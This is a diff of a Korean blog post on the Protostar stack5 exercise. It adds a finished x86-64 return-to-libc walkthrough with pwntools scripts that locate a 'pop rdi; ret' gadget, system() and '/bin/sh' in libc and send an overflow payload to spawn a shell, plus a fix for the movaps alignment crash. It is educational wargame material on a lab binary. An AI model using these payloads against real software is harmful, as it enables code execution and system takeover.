@@ -1,27 +1,27 @@
 ---
 layout: post
-title:  "Protostar-stack5.c x86 & x86-64(Updating)"
+title:  "Protostar-stack5.c x86 & x86-64"
 summary: RTL 실습 및 32비트/64비트 프로그램 RTL exploit의 차이
 author: TouBVa
 date: '2022-11-13 20:31:23 +09'
 category: System Hacking Basic
-thumbnail: /assets/img/posts/syshack5/Untitled.jpeg
+thumbnail: /assets/img/posts/protostar5/Untitled.jpeg
 keywords: System Hacking, RTL, x86, x86-64
 usemathjax: true
 permalink: /blog/protostar-stack5-x86-x64/
 ---
-
-# Protostar-stack5.c(Updating)
 
 학교 수업에서 풀이한 문제 중 하나로, x86에서의 RTL과 x86-64에서의 RTL을 모두 실습하기에 좋은 문제인 것 같아 블로그에 기록해본다.
 
 사실 이 문제는 BOF로 쉘코드를 넣으라고 만들어준 문제이긴 하지만, 1) 마음대로 RTL을 하기에도 괜찮아 보이고 2) 32bit로 컴파일 시 메인 함수의 에필로그가 달라지는 문제가 있기에 해결해 보고 싶어 선택했다.
 
 ---
+
+---
+
 # 0. X86에서의 RTL과 X64에서의 RTL
 
-
-## RTL이란
+## 0.1. RTL이란
 
 > RTL 이란 Return 2 Library(or Libc)의 약자로, 프로그램 실행 시 해당 언어로 짜인 코드에는 필수적으로 포함되는 라이브러리가(gcc 컴파일러의 경우 libc) 함께 메모리에 로딩되는 점을 악용하여 프로세스 플로우를 해당 라이브러리 내의 원하는 함수로 변경시켜 시스템이 공격자가 원하는 행위를 하도록 조작하는 공격 기법을 의미한다.
 > 
@@ -34,9 +34,7 @@ permalink: /blog/protostar-stack5-x86-x64/
     - 하드웨어 DEP는 메모리를 페이지 단위에서 실행 불가능으로 처리해 CPU에게 넘기는 방식이다.
     - 소프트웨어 DEP는 데이터 페이지 부근에서의 코드 실행을 막지는 못하지만 SEH 덮어쓰기 등의 공격은 막을 수 있다.
 
-
-## 요점
-
+## 0.2. 요점
 
 1. 32bit architecture의 함수 calling convention과 64bit architecture의 함수 calling convention은 레지스터 확보 문제로 인해 달라졌다.
 2. 32 bit architecture에서는 안 그래도 부족한 용량이라 연산 시 가상메모리 외의 용량 자원인 레지스터를 더 잘 써야 할 필요성이 있다. 즉, 그 귀한 레지스터를 꼴랑 함수의 파라미터를 저장하는 데 사용하지 않는다. 결과적으로 함수의 파라미터는 스택에 저장되어 전달된다.
@@ -62,11 +60,10 @@ permalink: /blog/protostar-stack5-x86-x64/
         
 
 ---
+
 # 1. X86 기반에서 RTL 수행하기
 
-
-## 파라미터가 스택에?
-
+## 1.1. 파라미터가 스택에?
 
 C 언어의 경우 함수의 Calling Convention을 정의해 둔 것은 __cdecl이다. 관련해 좀 더 자세한 설명과 리눅스에서 cdecl 사용을 확인하는 과정은 [여기](https://toubva.github.io/blog/system-hacking-step5/#/)
 
@@ -83,9 +80,7 @@ C 언어의 경우 함수의 Calling Convention을 정의해 둔 것은 __cdecl�
 
 파라미터는 마지막 파라미터부터 스택에 push된다는 점을 다시 한 번 주지하고자 한다. 왜냐하면 ESP는 pop될 때 낮은 주소에서 높은 주소로 이동하기 때문이다. 즉, 파라미터를 스택에 push한 것과 거꾸로의 순서를 따라 파라미터를 읽어오기 때문에 마지막 파라미터부터 push하는 것이다.
 
-
-## RTL을 위한 스택 조작
-
+## 1.2. RTL을 위한 스택 조작
 
 위에서 말한 Cdecl 규약에 따른다면, RTL을 하기 위해서는 어떤 식으로 스택을 조작해야 할까?
 
@@ -110,9 +105,7 @@ offset bytes + Library function address(RET) + 4 bytes(dump) + parameter address
 
 물론 다른 함수 호출 규약을 쓴다면 그건 그거대로 반영해야 할 문제일 테다.
 
-
-## 실습
-
+## 1.3. 실습
 
 어떠한 프로그램을 익스플로잇하기 위해서는 아래와 같은 과정을 거쳐야 한다.
 
@@ -122,9 +115,7 @@ offset bytes + Library function address(RET) + 4 bytes(dump) + parameter address
 
 실습에서는 위의 과정에 따라 순차적으로 익스플로잇 방식을 설명한다.
 
-
-### 1. 대상 프로그램 분석해 취약점 지정
-
+### 1.3.1. 대상 프로그램 분석해 취약점 지정
 
 프로그램의 소스 코드를 주었기 때문에 문제의 난이도가 낮은 편이다. 아래 소스 코드를 분석하며 취약점을 찾아 보자.
 
@@ -144,9 +135,7 @@ int main(int argc, char **argv)
 
 사용자의 입력값을 받아 지역 변수에 저장하는 간단한 프로그램이다. 그런데, 사용자의 입력값을 받을 때 `gets` 함수를 사용했다는 점에서 문제가 있다. 흔히 Boundary check라고 하는 사용자 입력값 길이 확인을 하지 않는 함수이기 때문이다. 즉, 위 프로그램의 문제는 gets 함수를 사용한 것으로, 해당 함수는 사용자가 주는 대로 전부 받아 저장하기 때문에 Buffer Overflow 취약점이 존재하는 함수이기 때문에 위 프로그램 또한 BOF 취약점을 가지게 되었다.
 
-
-### 2. BOF 취약점 익스플로잇할 방법 지정
-
+### 1.3.2. BOF 취약점 익스플로잇할 방법 지정
 
 이번에는 BOF와 연계한 RTL 방식으로 쉘을 딸 것이다. BOF-RTL에 사용될 페이로드가 아래와 같기 때문에, 성공시키기 위해 알아야만 하는 정보는
 
@@ -162,7 +151,7 @@ int main(int argc, char **argv)
 offset bytes + Library function address(RET) + 4 bytes(dump) + parameter address
 ```
 
-**2-1. offset bytes 구하기**
+**1.3.2.1. offset bytes 구하기**
 
 pwndbg를 stack5에 물려 보았다. 컴파일 옵션은 아래와 같다.(주의!! 아래 컴파일 옵션을 사용하면 안된다! `-mpreferred-stack-boundary=2` 로 해야 한다!!!! 이유는 마지막에 가서 설명하겠다)
 
@@ -182,7 +171,7 @@ buffer 변수는 64byte인데 왜 0x48, 즉 64+8 byte 만 주는지 궁금할 �
 
 따라서, 0x48byte를 모두 채우면 ebp의 바로 위까지를 변조할 수 있기 때문에 우리가 주어야 할 **offset byte는 0x48+0x4 = 0x4c byte**가 될 것이다. 
 
-**2-2. Library Function Address와 parameter 로 쓸 문자열 주소 구하기**
+**1.3.2.2. Library Function Address와 parameter 로 쓸 문자열 주소 구하기**
 
 먼저 쉘을 따는 데 사용할 수 있는 libc 내부 함수들이 많지만, 이번에는 system()함수를 사용해 보려 한다. system() 함수의 사용 규약은 아래와 같다.
 
@@ -247,9 +236,7 @@ execl("/bin/sh", "sh", "-c", command, (char *)NULL);
     ![Untitled](/assets/img/posts/protostar5/Untitled%206.jpeg)
     
 
-
-### 3. 익스플로잇 생성
-
+### 1.3.3. 익스플로잇 생성
 
 이제까지 알아낸 정보를 취합하면 페이로드의 구조를 아래와 같이 지정할 수 있다.
 
@@ -299,31 +286,220 @@ p.interactive()
 ```
 
 ---
+
 # 2. X86-64 기반에서 RTL 수행하기
 
-현재 작성 중…
+앞서 익스플로잇의 세 단계 중 두 단계를 끝냈기 때문에 이 절에서는 마지막 단계에 대해서만 서술한다.
 
+1. 대상 프로그램 분석해 취약점 지정
+2. 해당 취약점을 익스플로잇할 방법 지정
+3. 익스플로잇 생성
 
----
-# 삽질이 남긴 지식
+## 2.1. 페이로드가 왜 이 모양이야?
 
+64비트로 컴파일된 프로그램에 RTL을 하려면 아래와 같은 페이로드를 넣어야 한다.
 
-## 리눅스에서 프로그램 컴파일 시 refer되는 공유 라이브러리와 그 호출 과정
+```
+offset bytes + Gadget address(pop rdi;ret;) + parameter address + Library function address
+```
 
+대체 왜 그런 거지 싶다. 이유는 정말 간단한데, 앞서 설명했던 Cdecl 규정, 함수의 Calling Convention 때문이다. x86-64에서는 함수의 첫 파라미터 6개가 rdi, rsi, rdx, rcx, r8, r9에 순서대로 들어가고, 그러고도 파라미터가 남는다면 뒤에서부터 스택에 들어간다는 것을 꼭 기억하자. 
 
-먼저 pwndbg에서 vmmap을 이용해 어떤 라이브러리가 링킹되어 있는지 보자.
+우리는 system() 함수에 “/bin/sh” 문자열의 주소를 첫 번째이자 마지막 인자로 전달하는 것이 목적이다. 즉, “/bin/sh”의 주소를 rdi에 저장해야만 한다. 그렇게 하기 위해
+
+1. 스택 프레임의 ret add에 메모리에 적재된 수많은 인스트럭션 중 어딘가에 있을 `pop rdi;ret` 의 주소를 넣고
+2. 해당 인스트럭션 중 첫 번째로 `pop rdi` 가 실행된다면 rsp가 위치한 곳, 즉 현재 ret address의 바로 아래 위치가 rdi에 담기고 rsp가 한 주소 아래로 내려가게 될 것을 이용한다.
+3. 직후 `ret` 가 실행될 것, 즉 현재 위치한 rsp가 가리키는 스택 위치에 담긴 주소가 rip에 담겨 이다음에 실행될 것을 이용한다.
+
+이러한 흐름을 성공시키기 위해 페이로드는 위와 같은 형태가 된다.
+
+이 시점에서 알아내야 하는 정보는 4개로 좁혀진다.
+
+1. Offset byte의 크기
+2. Gadget의 주소
+3. “/bin/sh”의 주소
+4. system의 주소
+
+## 2.2. 익스플로잇 생성
+
+### 2.2.1. Offset Byte의 크기 알기
+
+`disas main` 명령어를 이용한다.
 
 ![Untitled](/assets/img/posts/protostar5/Untitled%2010.jpeg)
 
-`libc-2.27.so` 파일과 `ld-2.27.so` 파일이 링킹되어 있는 게 보인다. 엥? 그런데 이상하다. 분명히 우리가 ldd, 즉 libc database 커맨드로 확인했을 때 사용된 라이브러리는 아래와 같았다.
+gets에 들어가는 첫 번째 인자를 저장하는 rdi에 들어가는 값을 확인해 보면 `rbp-0x40` 임을 알 수 있다. 즉, rbp까지를 오염시키기 위해 0x48 bytes가 필요함을 알 수 있다.
+
+`offset byte = 0x48 bytes`
+
+### 2.2.2. Gadget의 주소 알기
+
+목표하는 gadget은 `pop rdi;ret;` 이다. 이를 찾기 위해 pwntools를 이용한다.
+
+![Untitled](/assets/img/posts/protostar5/Untitled%2011.jpeg)
+
+타겟 프로그램은 `/lib/x86_64-linux-gnu/libc.so.6` 을 사용하고 있음을 확인했다.
+
+따라서 가젯을 찾아오는 스크립트는 아래와 같다.
+
+```python
+from pwn import *
+
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+gadget=ROP(libc)
+
+print('gadget(ret rdi;ret;) = ', hex((gadget.find_gadget(['pop rdi', 'ret'])[0])))
+print('system=', hex(libc.symbols['system']))
+print('/bin/sh=', hex(list(libc.search(b'/bin/sh'))[0]))
+```
+
+스크립트 실행 결과는 아래와 같았다.
+
+![Untitled](/assets/img/posts/protostar5/Untitled%2012.jpeg)
+
+앞서 알아둔 라이브러리 시작 주소가 `0x7ffff7a0364f` 이고, 가젯의 오프셋이 `0x2164f` 이므로 둘을 더한 결과값인 `0x7ffff7a0364f` 에 정말로 가젯이 적재되어 있는지 gdb로 확인해 보자.
+
+![Untitled](/assets/img/posts/protostar5/Untitled%2013.jpeg)
+
+적재되어 있다.
+
+`Gadget address = 0x7ffff7a0364f` 
+
+### 2.2.3. “/bin/sh”과 system의 주소 알기
+
+위에서 가젯의 위치를 알아내기 위한 스크립트에서 이미 알아냈기 때문에 값만 쓰고 생략한다.
+
+`System offset = 0x4f420`
+
+`/bin/sh offset = 0x1b3d88` 
+
+일일이 더하고 싶지 않기 때문에 계산은 스크립트에게 맡겨야겠다.
+
+### 2.2.4. 익스플로잇 생성
+
+> 🤩: 좋아 이제 스크립트만 실행하면 끝이다!
+> 
+> 
+> 🤨: 아니 그런데 왜 안돼
+> 
+> 🤯: 아 SEGFAULT다
+> 
+> 💩: 하….
+> 
+
+이럴 땐 당황하지 말고 침착하게 트러블슈팅을 시작하면 된다. 물론 나는 너무 당황해서 찔끔 울긴 했는데
+
+pwntools에서 제공하는 기능 중, gdb에 현재 프로세스를 attach하게 해주는 기능이 있다. 현재 프로세스의 pid를 가져와 그것을 gdb에게 주는 식의 매커니즘인데, 이를 사용하는 방법은 아래와 같다.
+
+```python
+from pwn import *
+
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+gadget=ROP(libc)
+
+libc_base=0x7ffff79e2000
+
+gadget_offset = int((gadget.find_gadget(['pop rdi', 'ret'])[0]))
+system_offset = int(libc.symbols['system'])
+string_offset = int(list(libc.search(b'/bin/sh'))[0])
+
+gadget_address=libc_base+gadget_offset
+system_address=libc_base+system_offset
+string_address=libc_base+string_offset
+
+p = process('./stack5_64')
+
+payload = b'A'*0x48+p64(gadget_address)+p64(string_address)+p64(system_address)
+
+gdb.attach(p)
+
+raw_input("1")
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+`gdb.attach(process({program_name}))`를 이용해 스크립트에서 돌리는 프로그램에 gdb를 붙이도록 했고, gdb를 붙인 프로그램이 미처 반응하기도 전에 실행되고 끝나버리는 상황을 방지하기 위해 `raw_input(”1”)` 코드를 삽입했다. 위 스크립트를 실행하면 gdb 창이 뜨는데, 그때 브레이크 포인트를 설정하고 원래 터미널 창에 1을 입력한 후 gdb 창에서 `c` 를 누르면 디버깅을 할 수 있다.
+
+브레이크 포인트 설정 시 콜스택을 잘 확인해야 한다. 이미 실행되었던 인스트럭션에 브레이크 포인트를 설정하는 바보짓은 절대 엄금이다! *그렇다. 내가 바로 그 바보다! 안녕하세요 반갑습니다 바보 1입니다*
+
+`system` 함수는 `do_system` 함수를 콜하고, `do_system` 함수는 거의 끄트머리에서 `execve` 함수를 콜하면서 인자를 넘겨주는 형식이다. 즉, `do_system` 함수 내부로 들어갔을 때 `execve` 를 콜하기도 전에 SEGFAULT가 나는 이유를 알아내는 것이 현재 디버깅의 목적이다.
+
+![Untitled](/assets/img/posts/protostar5/Untitled%2014.jpeg)
+
+`c`를 누르고 보면 위 부분에서 rip가 freezed 된 것이 보인다.
+
+대관절 `movaps` 가 뭐냐 싶다.  검색해본 결과, `movaps` 는 64 비트 프로그램의 Calling convention을 지켜주고자 도입된 인스트럭션으로, 스택 주소가 16의 배수로 딱딱 떨어지게 데이터가 담겨있는 게 아니면 앞으로의 함수 콜에 심각한 문제가 생길 것을 우려해 프로그램을 멈추게 만드는 인스트럭션이다.
+
+지금 문제가 된 인스트럭션을 보면, `movaps xmmword ptr [rsp + 0x40], xmm0` 이라고 되어 있는데, xmm0라는 레지스터는 SIMD 연산에 사용되는 전용 레지스터인데, SIMD(Single Instruction Multi Data)라는 이름에서도 알 수 있듯 한 레지스터에 4개의 데이터를 한꺼번에 집어넣을 수 있는 레지스터이다. 지금은 중요하지 않으니 그냥 넘어가자. 중요한 것은 `xmmword ptr [rsp + 0x40]` 이다. 현재 보이는 컨텍스트의 아랫부분에 표현된 스택을 확인하면, rsp의 위치는 끝이 8로 끝나기 때문에 8의 배수이지만 16의 배수는 아니다. 여기에 `0x40` 을 더한 스택의 위치는 역시 8의 배수이지만 16의 배수는 아니다. 즉, `movaps` 인스트럭션의 종료 조건에 딱 들어맞는 상황이다.
+
+이런 상황은 사실 ROP 공격을 하지 않았다면 발생하지 않았을 상황이다. 그리고 ROP 공격을 할 때 가장 자주 맞닥뜨리는 pitfall 이기도 하다. 조금 더 자세한 설명은 [이쪽을 참고하자.](https://ropemporium.com/guide.html)
+
+말이 거창했는데, 해결법은 간단하다. 내가 rsp 주소를 마음대로 바꾸다가 rsp 주소가 16의 배수가 아닌 8의 배수가 되도록 만들어 놨으니, rsp가 한 칸(8 bytes)을 더 내려가든 올라가든 하도록 하면 된다. 이 때 딱히 페이로드 구조를 크게 바꾸지 않고 rsp가 한 칸(8 bytes) 더 이동하도록 하는 제일 쉬운 방법은 ret를 처음에 하나 끼워넣는 것이다.
+
+즉 페이로드는 아래와 같은 형태가 된다.
+
+```
+offset bytes + Gadget1 address(ret;) + Gadget2 address(pop rdi;ret;) + parameter address + Library function address
+```
+
+ret add에 있는 인스트럭션의 주소로 rip를 옮겨놓으니 또 `ret`을 하래서 rsp가 가리키는 주소에 있는 주소값을 rip에 넣어주니 이번엔 `pop rdi;ret;`가 기다리고 있는 형식이다.
+
+위와 같은 페이로드를 보내기 위해 스크립트를 아래와 같이 변형했다.
+
+```python
+from pwn import *
+
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+gadget=ROP(libc)
+
+libc_base=0x7ffff79e2000
+
+extra_ret_offset = int((gadget.find_gadget(['ret'])[0]))
+gadget_offset = int((gadget.find_gadget(['pop rdi', 'ret'])[0]))
+system_offset = int(libc.symbols['system'])
+string_offset = int(list(libc.search(b'/bin/sh'))[0])
+
+extra_ret_address=libc_base+extra_ret_offset
+gadget_address=libc_base+gadget_offset
+system_address=libc_base+system_offset
+string_address=libc_base+string_offset
+
+p = process('./stack5_64')
+
+payload = b'A'*0x48+p64(extra_ret_address)+p64(gadget_address)+p64(string_address)+p64(system_address)
+
+# gdb.attach(p)
+
+# raw_input("1")
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+스크립트 실행 결과 아래와 같이 쉘을 딸 수 있었다.
+
+![Untitled](/assets/img/posts/protostar5/Untitled%2015.jpeg)
+
+---
+
+# 3. 삽질이 남긴 지식
+
+## 3.1. 리눅스에서 프로그램 컴파일 시 refer되는 공유 라이브러리와 그 호출 과정
+
+먼저 pwndbg에서 vmmap을 이용해 어떤 라이브러리가 링킹되어 있는지 보자.
+
+![Untitled](/assets/img/posts/protostar5/Untitled%2016.jpeg)
+
+`[libc-2.27.so](http://libc-2.27.so)` 파일과 `[ld-2.27.so](http://ld-2.27.so)` 파일이 링킹되어 있는 게 보인다. 엥? 그런데 이상하다. 분명히 우리가 ldd, 즉 libc database 커맨드로 확인했을 때 사용된 라이브러리는 아래와 같았다.
 
 ![Untitled](/assets/img/posts/protostar5/Untitled%204.jpeg)
 
 아니 `libc.so.6` 이랑 `ld-linux.so.2` 썼다며? 그런데 왜 정작 사용된 건 다른 거야??
 
-
-### File Link
-
+### 3.1.1. File Link
 
 이에 관해서는 리눅스의 soft link와 linker의 동적 라이브러리 호출에 대해 안다면 답을 알 수 있다. 
 
@@ -332,20 +508,18 @@ p.interactive()
 - 하드 링크는 `ln {original file} {linked file}` 명령어로 생성한다. 이 경우 `ls -li` 명령어로 inode를 확인한다면 원본 파일과 링크된 파일의 inode 번호가 동일함을 확인할 수 있다. 이로 인해 원본 파일의 위치가 바뀌더라도 링크된 파일을 실행하면 원본 파일이 실행된다.
 - 소프트 링크는 `ln -s {original file} {linked file}` 명령어로 생성한다. 이 경우 `ls -li` 명령어로 inode와 파일 정보를 확인한다면 원본 파일과 링크된 파일의 inode 번호가 다르며, `->` 기호로 링크가 표시되어 있음을 확인할 수 있다. 이로 인해 원본 파일의 위치가 바뀌면 링크된 파일을 실행했을 때 링크가 원본 파일을 찾지 못한다. 아래 사진은 소프트 링크를 확인했을 때의 사진이다.
     
-    ![Untitled](/assets/img/posts/protostar5/Untitled%2011.jpeg)
+    ![Untitled](/assets/img/posts/protostar5/Untitled%2017.jpeg)
     
-    가장 첫 번째에 보이는 `libc-2.27.so` 파일의 inode num은 `6816882` 인데, 해당 파일에 소프트 링크가 걸려 있는 가장 마지막의 `libc.so.6` 파일의 inode num은 `6816904` 로 서로 다르다는 것을 확인할 수 있다.
+    가장 첫 번째에 보이는 `[libc-2.27.so](http://libc-2.27.so)` 파일의 inode num은 `6816882` 인데, 해당 파일에 소프트 링크가 걸려 있는 가장 마지막의 `libc.so.6` 파일의 inode num은 `6816904` 로 서로 다르다는 것을 확인할 수 있다.
     
 
-좋아, 그렇다면 파일 실행 시 **공유 라이브러리**로는 `libc.so.6` 을 썼기 때문에 소프트 링크의 오리지널 파일인 `libc-2.27.so` 가 사용됐고 **Dynamic Loader**로는 `ld-linux.so.2` 를 썼기 때문에 링크가 걸린 `ld-2.27.so` 가 사용됐다고 치자. (아래 사진 참고)
+좋아, 그렇다면 파일 실행 시 **공유 라이브러리**로는 `libc.so.6` 을 썼기 때문에 소프트 링크의 오리지널 파일인 `[libc-2.27.so](http://libc-2.27.so)` 가 사용됐고 **Dynamic Loader**로는 `ld-linux.so.2` 를 썼기 때문에 링크가 걸린 `[ld-2.27.so](http://ld-2.27.so)` 가 사용됐다고 치자. (아래 사진 참고)
 
-![Untitled](/assets/img/posts/protostar5/Untitled%2012.jpeg)
+![Untitled](/assets/img/posts/protostar5/Untitled%2018.jpeg)
 
 그런데 또 궁금한 게 생긴다. so 파일이 뭔지는 알겠는데… `so.2`와 `so.6`은 대체 무슨 뜻이야?
 
-
-### GCC를 이용한 C 언어 컴파일 시, 파일 실행 시의 행위
-
+### 3.1.2. GCC를 이용한 C 언어 컴파일 시, 파일 실행 시의 행위
 
 결론적으로 말하자면 `.so` 파일은 해당 라이브러리의 대표 호칭 격인 `Linker name`이고,  `.so.2` 등 뒤에 숫자가 붙은 파일은 해당 라이브러리의 하위 격인 `soname` 이다. 
 
@@ -356,15 +530,14 @@ p.interactive()
 - 파일 실행 시의 행위:
     - 이후 컴파일된 프로그램을 실행할 때 `Dynamic Loader` 가 실행되고 이것이 Dynamic Link 된 공유 라이브러리를 `soname` 을 이용해 각종 변수로부터 위치를 찾아낸 다음 메모리에 띄워 준다. 그렇다. `Dynamic Loader` 가 RTL 기법의 주범이었던 것이다…
 
-아무튼, 앞서 잠깐 언급했던 파일 실행 시의 행위를 이제 알아낸 정보를 이용해 더 구체화해 보자. 앞서 알아보았듯 해당 파일에게 지정된 Dynamic Loader는 `ld-linux.so.2` 인데, 심볼릭 링크 정책으로 인해 실제로는 `ld-2.27.so` 가 사용된다. 파일 실행 시 트리거된 Dynamic Loader는 soname을 이용해 어떤 라이브러리를 사용할지 찾아낸다. 
+아무튼, 앞서 잠깐 언급했던 파일 실행 시의 행위를 이제 알아낸 정보를 이용해 더 구체화해 보자. 앞서 알아보았듯 해당 파일에게 지정된 Dynamic Loader는 `[ld-](http://ld-2.27.so)linux.so.2` 인데, 심볼릭 링크 정책으로 인해 실제로는 `[ld-2.27.so](http://ld-2.27.so)` 가 사용된다. 파일 실행 시 트리거된 Dynamic Loader는 soname을 이용해 어떤 라이브러리를 사용할지 찾아낸다. 
 
-여기에서 soname을 가진 라이브러리는 `libc.so.6`이기 때문에 Dynamic Loader는 `libc.so.6` 을 실행시킴으로써 메모리에 적재하려 한다. 그런데, 심볼릭 링크 정책으로 인해 `libc-2.27.so` 가 실행되며 메모리에 적재된다. 이로 인해 실행 상태인 프로그램에 사용된 라이브러리를 사용하면 `libc.so.6` 으로 뜨지 않는다.
+여기에서 soname을 가진 라이브러리는 `libc.so.6`이기 때문에 Dynamic Loader는 `libc.so.6` 을 실행시킴으로써 메모리에 적재하려 한다. 그런데, 심볼릭 링크 정책으로 인해 `[libc-2.27.so](http://libc-2.27.so)` 가 실행되며 메모리에 적재된다. 이로 인해 실행 상태인 프로그램에 사용된 라이브러리를 사용하면 `libc.so.6` 으로 뜨지 않는다.
 
 마지막 의문이 하나 생긴다. 왜 굳이? 왜 굳이 이렇게 심볼릭 링크를 써서 돌아 돌아 가는 것일까? 그 이유는 라이브러리 연결의 호환성을 좋게 하기 위해서이다. 통상적으로 `{library_name.so.1.5}->{library_name.so}` 의 구도로 링크가 걸리는데, 이는 개발 환경에 `.so.1.5` 버전의 라이브러리뿐 아니라 다른 버전의 라이브러리도 존재할 수 있기 때문에 어떤 버전(어떤 soname)을 사용하든 안정적으로 필요한 Linker name을 가진 라이브러리와 연결해주기 위해서 생겨난 방식이다.
 
-
 ---
-# 참고문헌
 
+# 4. 참고문헌
 
 - x64dbg 디버거를 활용한 리버싱과 시스템 해킹의 원리(김민수 저, 210p RTL)
